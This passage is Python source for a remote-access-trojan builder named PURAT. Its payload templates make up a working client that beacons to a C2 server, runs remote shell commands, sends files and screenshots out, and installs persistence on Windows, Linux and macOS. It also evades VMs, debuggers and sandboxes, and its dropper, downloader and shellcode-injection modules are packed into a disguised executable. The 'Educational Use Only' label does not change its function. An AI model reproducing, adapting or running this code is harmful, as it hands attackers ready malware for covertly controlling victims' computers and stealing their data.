        """Split code into multiple parts"""
        # Simple splitting - would be more complex in production
        lines = code.split('\n')
        midpoint = len(lines) // 2
        
        part1 = '\n'.join(lines[:midpoint])
        part2 = '\n'.join(lines[midpoint:])
        
        # Reconstruct with splitting
        split_code = f'''
# Part 1
{part1}

# Part 2  
{part2}
'''
        
        return split_code
    
    def _flatten_code(self, code: str) -> str:
        """Flatten code structure"""
        # Remove empty lines and extra spaces
        lines = [line.strip() for line in code.split('\n') if line.strip()]
        return ' '.join(lines)
    
    def _split_into_sections(self, code: str, section_size: int = 10) -> List[str]:
        """Split code into sections"""
        lines = code.split('\n')
        sections = []
        
        for i in range(0, len(lines), section_size):
            section = '\n'.join(lines[i:i + section_size])
            sections.append(section)
        
        return sections
    
    def _clean_code(self, code: str) -> str:
        """Clean code after obfuscation"""
        # Remove null bytes
        code = code.replace('\x00', '')
        
        # Remove extra whitespace
        lines = [line.rstrip() for line in code.split('\n')]
        
        # Remove consecutive blank lines
        cleaned_lines = []
        previous_blank = False
        
        for line in lines:
            if line.strip() == '':
                if not previous_blank:
                    cleaned_lines.append(line)
                    previous_blank = True
            else:
                cleaned_lines.append(line)
                previous_blank = False
        
        return '\n'.join(cleaned_lines)

# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class PayloadType(Enum):
    STUB = "stub"
    DROPPER = "dropper"
    DOWNLOADER = "downloader"
    BINDER = "binder"
    INJECTOR = "injector"
    REFLECTIVE = "reflective"

class PayloadArchitecture(Enum):
    X86 = "x86"
    X64 = "x64"
    ANY = "any"

class PayloadGenerator:
    """Advanced payload generator"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.obfuscator = ObfuscationEngine(
            ObfuscationLevel(config.get('obfuscation_level', 3))
        )
        self.encryption = EncryptionEngine()
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict[str, str]:
        """Load payload templates"""
        return {
            "stub": self._get_stub_template(),
            "dropper": self._get_dropper_template(),
            "downloader": self._get_downloader_template(),
            "injector": self._get_injector_template()
        }
    
    def _get_stub_template(self) -> str:
        """Get stub payload template"""
        return '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PURAT Client - Stub Payload
Educational Use Only
"""

import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import tempfile
import getpass
import uuid
import io

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {CONFIG}

# ============================================================================
# SYSTEM INFORMATION
# ============================================================================

class SystemInfo:
    """System information collector"""
    
    @staticmethod
    def collect() -> dict:
        """Collect system information"""
        info = {
            'id': hashlib.md5(f"{socket.gethostname()}{getpass.getuser()}".encode()).hexdigest()[:16],
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'architecture': platform.architecture()[0],
            'timestamp': time.time(),
            'ip': SystemInfo.get_ip(),
            'mac': SystemInfo.get_mac(),
            'antivirus': SystemInfo.get_antivirus(),
            'processors': os.cpu_count(),
            'privileges': SystemInfo.get_privileges()
        }
        return info
    
    @staticmethod
    def get_ip() -> str:
        """Get IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_mac() -> str:
        """Get MAC address"""
        try:
            mac = uuid.getnode()
            return ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:00:00:00:00:00"
    
    @staticmethod
    def get_antivirus() -> list:
        """Get antivirus information"""
        av_list = []
        if platform.system() == "Windows":
            try:
                import winreg
                # Check common AV registry keys
                pass
            except:
                pass
        return av_list
    
    @staticmethod
    def get_privileges() -> bool:
        """Check if running with privileges"""
        try:
            if platform.system() == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

# ============================================================================
# ENCRYPTION
# ============================================================================

class Crypto:
    """Encryption utilities"""
    
    def __init__(self, key: str = None):
        self.key = key or CONFIG.get('encryption_key', 'default_key')
        self.key_hash = hashlib.sha256(self.key.encode()).digest()
    
    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data"""
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key_hash[i % len(self.key_hash)])
        return zlib.compress(bytes(encrypted), level=9)
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        decompressed = zlib.decompress(data)
        decrypted = bytearray()
        for i, byte in enumerate(decompressed):
            decrypted.append(byte ^ self.key_hash[i % len(self.key_hash)])
        return bytes(decrypted)
    
    def encrypt_string(self, text: str) -> str:
        """Encrypt string"""
        return base64.b64encode(self.encrypt(text.encode())).decode()
    
    def decrypt_string(self, text: str) -> str:
        """Decrypt string"""
        return self.decrypt(base64.b64decode(text)).decode()

# ============================================================================
# NETWORK CLIENT
# ============================================================================

class NetworkClient:
    """C2 Network client"""
    
    def __init__(self):
        self.crypto = Crypto()
        self.socket = None
        self.connected = False
        self.server_ip = CONFIG.get('c2_ip', '127.0.0.1')
        self.server_port = CONFIG.get('c2_port', 8080)
        self.reconnect_delay = CONFIG.get('reconnect_interval', 30)
        self.timeout = CONFIG.get('timeout', 60)
    
    def connect(self) -> bool:
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            self.socket.connect((self.server_ip, self.server_port))
            self.connected = True
            
            # Send handshake
            self.send_handshake()
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            self.connected = False
            return False
    
    def send_handshake(self):
        """Send handshake to server"""
        handshake = {
            'type': 'handshake',
            'id': SystemInfo.collect()['id'],
            'system': SystemInfo.collect(),
            'timestamp': time.time(),
            'version': '1.0'
        }
        self.send(handshake)
    
    def send(self, data: dict):
        """Send data to server"""
        try:
            json_data = json.dumps(data).encode()
            encrypted = self.crypto.encrypt(json_data)
            
            # Send length
            length = len(encrypted)
            self.socket.sendall(struct.pack('!I', length))
            
            # Send data
            self.socket.sendall(encrypted)
            
        except Exception as e:
            print(f"[-] Send error: {e}")
            self.connected = False
    
    def receive(self) -> dict:
        """Receive data from server"""
        try:
            # Receive length
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            
            # Receive data
            data = b''
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            # Decrypt and parse
            decrypted = self.crypto.decrypt(data)
            return json.loads(decrypted.decode())
            
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    def run(self):
        """Main client loop"""
        print(f"[*] Starting C2 client to {self.server_ip}:{self.server_port}")
        
        while True:
            if not self.connected:
                if not self.connect():
                    time.sleep(self.reconnect_delay)
                    continue
            
            try:
                # Receive command
                command = self.receive()
                
                if not command:
                    print("[-] Connection lost")
                    self.connected = False
                    continue
                
                # Execute command
                response = self.execute_command(command)
                
                # Send response
                if response:
                    self.send(response)
                
            except Exception as e:
                print(f"[-] Communication error: {e}")
                self.connected = False
    
    def execute_command(self, command: dict) -> dict:
        """Execute received command"""
        cmd_type = command.get('type', '')
        
        try:
            if cmd_type == 'system_info':
                return {
                    'type': 'system_info',
                    'data': SystemInfo.collect()
                }
            
            elif cmd_type == 'shell':
                return self.execute_shell(command.get('command', ''))
            
            elif cmd_type == 'file_list':
                return self.list_files(command.get('path', '.'))
            
            elif cmd_type == 'download':
                return self.download_file(command.get('path', ''))
            
            elif cmd_type == 'screenshot':
                return self.take_screenshot()
            
            elif cmd_type == 'process_list':
                return self.list_processes()
            
            elif cmd_type == 'uninstall':
                return {'type': 'uninstall', 'status': 'success'}
            
            else:
                return {'type': 'error', 'message': f'Unknown command: {cmd_type}'}
                
        except Exception as e:
            return {'type': 'error', 'message': str(e)}
    
    def execute_shell(self, command: str) -> dict:
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'type': 'shell',
                'command': command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {'type': 'error', 'message': 'Command timeout'}
        except Exception as e:
            return {'type': 'error', 'message': str(e)}
    
    def list_files(self, path: str) -> dict:
        """List files in directory"""
        try:
            if not os.path.exists(path):
                return {'type': 'error', 'message': f'Path not found: {path}'}
            
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat_info = os.stat(item_path)
                    files.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat_info.st_size,
                        'modified': stat_info.st_mtime
                    })
                except:
                    continue
            
            return {
                'type': 'file_list',
                'path': path,
                'files': files
            }
            
        except Exception as e:
            return {'type': 'error', 'message': str(e)}
    
    def download_file(self, path: str) -> dict:
        """Download file"""
        try:
            if not os.path.exists(path):
                return {'type': 'error', 'message': f'File not found: {path}'}
            
            with open(path, 'rb') as f:
                content = f.read()
            
            max_size = CONFIG.get('max_file_size', 10) * 1024 * 1024
            if len(content) > max_size:
                return {'type': 'error', 'message': f'File too large (>{max_size} bytes)'}
            
            encoded = base64.b64encode(content).decode()
            
            return {
                'type': 'file_download',
                'path': path,
                'content': encoded,
                'size': len(content)
            }
            
        except Exception as e:
            return {'type': 'error', 'message': str(e)}
    
    def take_screenshot(self) -> dict:
        """Take screenshot"""
        try:
            # Try different screenshot methods
            try:
                import pyautogui
                screenshot = pyautogui.screenshot()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                img_bytes = img_bytes.getvalue()
                
                return {
                    'type': 'screenshot',
                    'format': 'png',
                    'content': base64.b64encode(img_bytes).decode(),
                    'size': len(img_bytes)
                }
            except ImportError:
                return {'type': 'error', 'message': 'Screenshot library not available'}
                
        except Exception as e:
            return {'type': 'error', 'message': str(e)}
    
    def list_processes(self) -> dict:
        """List running processes"""
        try:
            import psutil
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                except:
                    continue
            
            return {
                'type': 'process_list',
                'processes': processes
            }
            
        except ImportError:
            return {'type': 'error', 'message': 'psutil not available'}
        except Exception as e:
            return {'type': 'error', 'message': str(e)}

# ============================================================================
# PERSISTENCE
# ============================================================================

class Persistence:
    """Persistence mechanisms"""
    
    @staticmethod
    def install():
        """Install persistence"""
        if not CONFIG.get('persistence', True):
            return
        
        print("[*] Installing persistence...")
        
        try:
            if platform.system() == "Windows":
                Persistence._install_windows()
            elif platform.system() == "Linux":
                Persistence._install_linux()
            elif platform.system() == "Darwin":
                Persistence._install_mac()
            
            print("[+] Persistence installed")
            
        except Exception as e:
            print(f"[-] Persistence error: {e}")
    
    @staticmethod
    def _install_windows():
        """Windows persistence"""
        try:
            import winreg
            
            # Registry run key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            install_name = CONFIG.get('install_name', 'WindowsUpdate.exe')
            install_path = CONFIG.get('install_path', sys.executable)
            
            winreg.SetValueEx(key, install_name, 0, winreg.REG_SZ, install_path)
            winreg.CloseKey(key)
            
        except Exception as e:
            print(f"[-] Windows persistence failed: {e}")
    
    @staticmethod
    def _install_linux():
        """Linux persistence"""
        try:
            # Add to crontab
            cron_line = f"@reboot {sys.executable} > /dev/null 2>&1 &"
            cron_file = "/tmp/purat_cron"
            
            with open(cron_file, 'w') as f:
                f.write(cron_line + "\\n")
            
            os.system(f"(crontab -l 2>/dev/null; cat {cron_file}) | crontab -")
            os.remove(cron_file)
            
        except Exception as e:
            print(f"[-] Linux persistence failed: {e}")
    
    @staticmethod
    def _install_mac():
        """macOS persistence"""
        try:
            # LaunchAgents
            launch_agent = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.purat.client</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            
            agent_path = os.path.expanduser("~/Library/LaunchAgents/com.purat.client.plist")
            
            with open(agent_path, 'w') as f:
                f.write(launch_agent)
            
        except Exception as e:
            print(f"[-] macOS persistence failed: {e}")

# ============================================================================
# ANTI-ANALYSIS
# ============================================================================

class AntiAnalysis:
    """Anti-analysis techniques"""
    
    @staticmethod
    def check() -> bool:
        """Check for analysis environment"""
        if not CONFIG.get('anti_analysis', True):
            return False
        
        checks = [
            AntiAnalysis._check_vm(),
            AntiAnalysis._check_debugger(),
            AntiAnalysis._check_sandbox(),
            AntiAnalysis._check_process_list()
        ]
        
        return any(checks)
    
    @staticmethod
    def _check_vm() -> bool:
        """Check for virtual machine"""
        if platform.system() != "Windows":
            return False
        
        try:
            # Check for VM strings in hostname
            vm_strings = ['VMware', 'VirtualBox', 'VBox', 'QEMU', 'KVM', 'Virtual', 'VMW', 'VRT']
            hostname = socket.gethostname().upper()
            
            for vm in vm_strings:
                if vm.upper() in hostname:
                    return True
            
            # Check registry
            try:
                import winreg
                
                vm_reg_paths = [
                    r"HARDWARE\\ACPI\\DSDT\\VBOX__",
                    r"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
                    r"SYSTEM\\ControlSet001\\Services\\vmdebug"
                ]
                
                for path in vm_reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        winreg.CloseKey(key)
                        return True
                    except:
                        continue
                        
            except:
                pass
            
            return False
            
        except:
            return False
    
    @staticmethod
    def _check_debugger() -> bool:
        """Check for debugger"""
        if platform.system() != "Windows":
            return False
        
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            
            # IsDebuggerPresent
            if kernel32.IsDebuggerPresent():
                return True
            
            # CheckRemoteDebuggerPresent
            is_debugger = ctypes.c_int()
            if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugger)):
                return bool(is_debugger.value)
            
            return False
            
        except:
            return False
    
    @staticmethod
    def _check_sandbox() -> bool:
        """Check for sandbox"""
        # Check for small amount of RAM
        try:
            import psutil
            ram = psutil.virtual_memory().total
            
            # Less than 2GB might be a sandbox
            if ram < 2 * 1024**3:  # 2GB
                return True
                
        except:
            pass
        
        # Check for recent file creation (sandboxes often create files quickly)
        try:
            temp_files = len(os.listdir(tempfile.gettempdir()))
            if temp_files < 5:  # Very few temp files
                return True
        except:
            pass
        
        return False
    
    @staticmethod
    def _check_process_list() -> bool:
        """Check process list for analysis tools"""
        try:
            import psutil
            
            analysis_tools = [
                'wireshark', 'procmon', 'processhacker', 'proc explorer',
                'ida', 'ollydbg', 'x64dbg', 'windbg', 'immunity',
                'vboxservice', 'vboxtray', 'vmwaretray', 'vmwareuser'
            ]
            
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                for tool in analysis_tools:
                    if tool in proc_name:
                        return True
                        
        except:
            pass
        
        return False

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print(f"""
    ╔══════════════════════════════════════════════╗
    ║         PURAT Client v1.0                    ║
    ║         Educational Use Only                 ║
    ║         ID: {SystemInfo.collect()['id']}               ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Check for test mode
    if os.environ.get('PURAT_TEST_MODE') == '1':
        print("[!] Running in test mode")
        return
    
    # Anti-analysis checks
    if AntiAnalysis.check():
        print("[!] Analysis environment detected. Exiting.")
        return
    
    # Install persistence
    if CONFIG.get('persistence', True):
        Persistence.install()
    
    # Start network client
    client = NetworkClient()
    client.run()

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Custom code execution
    custom_code = CONFIG.get('custom_code', '')
    if custom_code and custom_code.strip():
        try:
            exec(custom_code)
        except Exception as e:
            print(f"[!] Custom code error: {e}")
    
    # Run main function
    try:
        main()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
'''
    
    def _get_dropper_template(self) -> str:
        """Get dropper template"""
        return self._get_stub_template() + '''
# ============================================================================
# DROPPER FUNCTIONALITY
# ============================================================================

class Dropper:
    """Dropper functionality"""
    
    @staticmethod
    def drop_payload(url: str, save_path: str = None) -> bool:
        """Download and execute payload from URL"""
        try:
            import urllib.request
            
            if save_path is None:
                save_path = os.path.join(tempfile.gettempdir(), 'update.exe')
            
            # Download payload
            print(f"[*] Downloading payload from {url}")
            urllib.request.urlretrieve(url, save_path)
            
            # Execute
            if platform.system() == "Windows":
                subprocess.Popen([save_path], shell=True)
            else:
                os.chmod(save_path, 0o755)
                subprocess.Popen([save_path])
            
            print(f"[+] Payload dropped: {save_path}")
            return True
            
        except Exception as e:
            print(f"[-] Dropper error: {e}")
            return False
    
    @staticmethod
    def execute_from_memory(data: bytes):
        """Execute payload from memory"""
        try:
            # Write to temp file and execute
            temp_path = os.path.join(tempfile.gettempdir(), f'mem_{hashlib.md5(data).hexdigest()[:8]}.exe')
            
            with open(temp_path, 'wb') as f:
                f.write(data)
            
            if platform.system() == "Windows":
                subprocess.Popen([temp_path], shell=True)
            else:
                os.chmod(temp_path, 0o755)
                subprocess.Popen([temp_path])
            
        except Exception as e:
            print(f"[-] Memory execution error: {e}")
'''
    
    def _get_downloader_template(self) -> str:
        """Get downloader template"""
        return self._get_stub_template() + '''
# ============================================================================
# DOWNLOADER FUNCTIONALITY
# ============================================================================

class Downloader:
    """Downloader functionality"""
    
    @staticmethod
    def download_execute(url: str, arguments: list = None) -> bool:
        """Download and execute file"""
        try:
            import urllib.request
            
            # Get filename from URL
            filename = url.split('/')[-1]
            if not filename:
                filename = 'download.exe'
            
            save_path = os.path.join(tempfile.gettempdir(), filename)
            
            # Download
            print(f"[*] Downloading: {url}")
            urllib.request.urlretrieve(url, save_path)
            
            # Execute
            if arguments is None:
                arguments = []
            
            cmd = [save_path] + arguments
            
            if platform.system() == "Windows":
                subprocess.Popen(cmd, shell=True)
            else:
                os.chmod(save_path, 0o755)
                subprocess.Popen(cmd)
            
            print(f"[+] Downloaded and executed: {save_path}")
            return True
            
        except Exception as e:
            print(f"[-] Downloader error: {e}")
            return False
'''
    
    def _get_injector_template(self) -> str:
        """Get injector template"""
        return self._get_stub_template() + '''
# ============================================================================
# PROCESS INJECTION
# ============================================================================

class Injector:
    """Process injection functionality"""
    
    @staticmethod
    def inject_into_process(process_name: str, shellcode: bytes) -> bool:
        """Inject shellcode into process"""
        if platform.system() != "Windows":
            print("[-] Injection only supported on Windows")
            return False
        
        try:
            import ctypes
            from ctypes import wintypes
            
            # Find process
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    pid = proc.info['pid']
                    
                    # Open process
                    PROCESS_ALL_ACCESS = 0x1F0FFF
                    process_handle = ctypes.windll.kernel32.OpenProcess(
                        PROCESS_ALL_ACCESS, False, pid
                    )
                    
                    if not process_handle:
                        print(f"[-] Failed to open process {pid}")
                        return False
                    
                    # Allocate memory
                    mem_address = ctypes.windll.kernel32.VirtualAllocEx(
                        process_handle,
                        0,
                        len(shellcode),
                        0x3000,  # MEM_COMMIT | MEM_RESERVE
                        0x40     # PAGE_EXECUTE_READWRITE
                    )
                    
                    if not mem_address:
                        ctypes.windll.kernel32.CloseHandle(process_handle)
                        return False
                    
                    # Write shellcode
                    written = ctypes.c_size_t(0)
                    ctypes.windll.kernel32.WriteProcessMemory(
                        process_handle,
                        mem_address,
                        shellcode,
                        len(shellcode),
                        ctypes.byref(written)
                    )
                    
                    if written.value != len(shellcode):
                        ctypes.windll.kernel32.VirtualFreeEx(process_handle, mem_address, 0, 0x8000)
                        ctypes.windll.kernel32.CloseHandle(process_handle)
                        return False
                    
                    # Create remote thread
                    thread_id = ctypes.c_ulong(0)
                    thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
                        process_handle,
                        None,
                        0,
                        mem_address,
                        None,
                        0,
                        ctypes.byref(thread_id)
                    )
                    
                    if not thread_handle:
                        ctypes.windll.kernel32.VirtualFreeEx(process_handle, mem_address, 0, 0x8000)
                        ctypes.windll.kernel32.CloseHandle(process_handle)
                        return False
                    
                    # Cleanup
                    ctypes.windll.kernel32.CloseHandle(thread_handle)
                    ctypes.windll.kernel32.CloseHandle(process_handle)
                    
                    print(f"[+] Injected into {process_name} (PID: {pid})")
                    return True
            
            print(f"[-] Process {process_name} not found")
            return False
            
        except Exception as e:
            print(f"[-] Injection error: {e}")
            return False
'''
    
    def generate(self, payload_type: str = None) -> str:
        """Generate payload"""
        if payload_type is None:
            payload_type = self.config.get('payload_type', 'stub')
        
        # Get template
        template = self.templates.get(payload_type, self.templates['stub'])
        
        # Format template with config
        payload = template.format(
            CONFIG=json.dumps(self.config, indent=2)
        )
        
        # Apply obfuscation if enabled
        if self.config.get('obfuscate', True):
            obfuscation_level = self.config.get('obfuscation_level', 3)
            techniques = self._get_obfuscation_techniques(obfuscation_level)
            
            payload = self.obfuscator.obfuscate(payload, techniques)
        
        # Clean payload
        payload = self._clean_payload(payload)
        
        return payload
    
    def _get_obfuscation_techniques(self, level: int) -> List[ObfuscationTechnique]:
        """Get obfuscation techniques for level"""
        techniques = [
            ObfuscationTechnique.RENAME_VARIABLES,
            ObfuscationTechnique.STRING_ENCRYPTION,
            ObfuscationTechnique.JUNK_CODE
        ]
        
        if level >= 2:
            techniques.extend([
                ObfuscationTechnique.RENAME_FUNCTIONS,
                ObfuscationTechnique.CONTROL_FLOW,
                ObfuscationTechnique.DEAD_CODE
            ])
        
        if level >= 3:
            techniques.extend([
                ObfuscationTechnique.RENAME_CLASSES,
                ObfuscationTechnique.CODE_SPLITTING
            ])
        
        if level >= 4:
            techniques.extend([
                ObfuscationTechnique.CODE_ENCRYPTION,
                ObfuscationTechnique.CODE_FLATTENING
            ])
        
        return techniques
    
    def _clean_payload(self, payload: str) -> str:
        """Clean payload to remove problematic characters"""
        # Remove null bytes
        payload = payload.replace('\x00', '')
        
        # Remove carriage returns
        payload = payload.replace('\r', '')
        
        # Ensure proper line endings
        lines = payload.split('\n')
        cleaned_lines = []
        
        for line in lines:
            # Remove trailing whitespace
            line = line.rstrip()
            cleaned_lines.append(line)
        
        # Remove consecutive blank lines
        final_lines = []
        previous_blank = False
        
        for line in cleaned_lines:
            if line.strip() == '':
                if not previous_blank:
                    final_lines.append(line)
                    previous_blank = True
            else:
                final_lines.append(line)
                previous_blank = False
        
        return '\n'.join(final_lines)
    
    def save_to_file(self, filename: str, payload_type: str = None) -> bool:
        """Save payload to file"""
        try:
            payload = self.generate(payload_type)
            
            # Ensure directory exists
            os.makedirs(os.path.dirname(os.path.abspath(filename)), exist_ok=True)
            
            # Write with proper encoding
            with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(payload)
            
            print(f"[+] Payload saved: {filename} ({len(payload)} bytes)")
            return True
            
        except Exception as e:
            print(f"[-] Save error: {e}")
            return False
    
    def build_exe(self, input_file: str, output_file: str, 
                  icon: str = None, upx: bool = True) -> bool:
        """Build EXE using PyInstaller"""
        try:
            if not os.path.exists(input_file):
                print(f"[-] Input file not found: {input_file}")
                return False
            
            # Check PyInstaller
            try:
                import PyInstaller
            except ImportError:
                print("[*] Installing PyInstaller...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            
            # Build command
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--clean',
                f'--name={os.path.splitext(os.path.basename(output_file))[0]}',
                '--distpath', os.path.dirname(output_file),
                '--workpath', os.path.join(os.path.dirname(output_file), 'build'),
                '--specpath', os.path.join(os.path.dirname(output_file), 'spec')
            ]
            
            # Add UPX packing
            if upx:
                cmd.append('--upx-dir=upx')
            
            # Add icon
            if icon and os.path.exists(icon):
                cmd.append(f'--icon={icon}')
            
            # Add hidden imports
            hidden_imports = ['pyautogui', 'psutil', 'pyscreenshot', 'Crypto']
            for imp in hidden_imports:
                cmd.append(f'--hidden-import={imp}')
            
            # Add runtime hooks for anti-analysis
            if self.config.get('anti_analysis', True):
                cmd.append('--runtime-hook=anti_analysis_hook.py')
            
            # Add input file
            cmd.append(input_file)
            
            print(f"[*] Building EXE: {' '.join(cmd)}")
            
            # Run PyInstaller
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=300,
                shell=True
            )
            
            if result.returncode == 0:
                print("[+] EXE built successfully")
                
                # Check if EXE was created
                if os.path.exists(output_file):
                    size = os.path.getsize(output_file)
                    print(f"[+] File: {output_file}")
                    print(f"[+] Size: {size:,} bytes ({size/1024/1024:.2f} MB)")
                    return True
                else:
                    # Check in dist folder
                    dist_file = os.path.join('dist', os.path.basename(output_file))
                    if os.path.exists(dist_file):
                        shutil.copy(dist_file, output_file)
                        size = os.path.getsize(output_file)
                        print(f"[+] File copied from dist: {output_file}")
                        print(f"[+] Size: {size:,} bytes ({size/1024/1024:.2f} MB)")
                        return True
                    
                    print("[-] EXE not found after build")
                    return False
            else:
                print(f"[-] Build failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            print("[-] Build timeout")
            return False
        except Exception as e:
            print(f"[-] Build error: {e}")
            return False

# ============================================================================
# MAIN APPLICATION - PROFESSIONAL GUI
# ============================================================================

class ProfessionalRATBuilder:
    """Professional RAT Builder with complete GUI"""
    
    def __init__(self):
        # Initialize components
        self.theme_manager = ThemeManager()
        self.animation_engine = AnimationEngine()
        self.config = self._load_default_config()
        self.payload_generator = None
        
        # GUI elements
        self.root = None
        self.notebook = None
        self.tabs = {}
        self.status_bar = None
        self.progress_bar = None
        self.build_log = None
        self.log_text = None
        
        # Variables
        self.current_theme = "DARK_PRO"
        self.server_running = False
        self.clients_connected = 0
        
        # Start application
        self._init_application()
    
    def _load_default_config(self) -> Dict:
        """Load default configuration"""
        return {
            'basic': {
                'c2_ip': '127.0.0.1',
                'c2_port': 8080,
                'protocol': 'tcp',
                'install_name': 'WindowsUpdate.exe',
                'install_path': '%APPDATA%\\Microsoft\\Windows',
                'startup_name': 'Windows Update',
                'mutex_name': 'Global\\WindowsUpdateMutex'
            },
            'features': {feature: False for feature in FEATURE_MODULES},
            'evasion': {technique: False for technique in EVASION_TECHNIQUES},
            'stealth': {technique: False for technique in STEALTH_TECHNIQUES},
            'network': {
                'reconnect_interval': 30,
                'timeout': 60,
                'retry_count': 5,
                'use_https': False,
                'use_dns': False,
                'use_tor': False,
                'use_proxy': False,
                'proxy_host': '',
                'proxy_port': 0,
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            'advanced': {
                'encryption_key': hashlib.sha256(os.urandom(32)).hexdigest()[:32],
                'compression_level': 9,
                'max_file_size': 10,
                'obfuscation_level': 3,
                'icon_file': '',
                'version_info': '',
                'custom_code': '',
                'delay_execution': 0,
                'output_format': 'EXE',
                'architecture': 'x64',
                'upx_pack': True,
                'anti_analysis': True
            },
            'payload': {
                'type': 'stub',
                'method': 'standard',
                'injection_target': 'explorer.exe',
                'sleep_time': 0,
                'junk_code': True,
                'fake_messages': False,
                'self_destruct': False,
                'self_destruct_days': 30
            }
        }
    
    def _init_application(self):
        """Initialize application"""
        # Create main window
        self.root = tk.Tk()
        self.root.title(f"{APP_NAME} - Professional Edition")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Set window icon
        try:
            self.root.iconbitmap(default='icon.ico')
        except:
            pass
        
        # Configure grid
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Apply theme
        self.theme_manager.set_theme(self.current_theme)
        self.theme_manager.apply(self.root)
        
        # Create GUI
        self._create_menu()
        self._create_main_container()
        self._create_status_bar()
        
        # Center window
        self._center_window()
        
        # Initial animation
        self.root.after(100, lambda: self.animation_engine.fade_in(self.root))
    
    def _create_menu(self):
        """Create menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Configuration", accelerator="Ctrl+N", command=self._new_config)
        file_menu.add_command(label="Open Configuration", accelerator="Ctrl+O", command=self._load_config)
        file_menu.add_command(label="Save Configuration", accelerator="Ctrl+S", command=self._save_config)
        file_menu.add_command(label="Save As...", accelerator="Ctrl+Shift+S", command=self._save_config_as)
        file_menu.add_separator()
        file_menu.add_command(label="Import Config", command=self._import_config)
        file_menu.add_command(label="Export Config", command=self._export_config)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", accelerator="Alt+F4", command=self.root.quit)
        
        # Edit menu
        edit_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Edit", menu=edit_menu)
        edit_menu.add_command(label="Undo", accelerator="Ctrl+Z", command=self._undo)
        edit_menu.add_command(label="Redo", accelerator="Ctrl+Y", command=self._redo)
        edit_menu.add_separator()
        edit_menu.add_command(label="Cut", accelerator="Ctrl+X", command=self._cut)
        edit_menu.add_command(label="Copy", accelerator="Ctrl+C", command=self._copy)
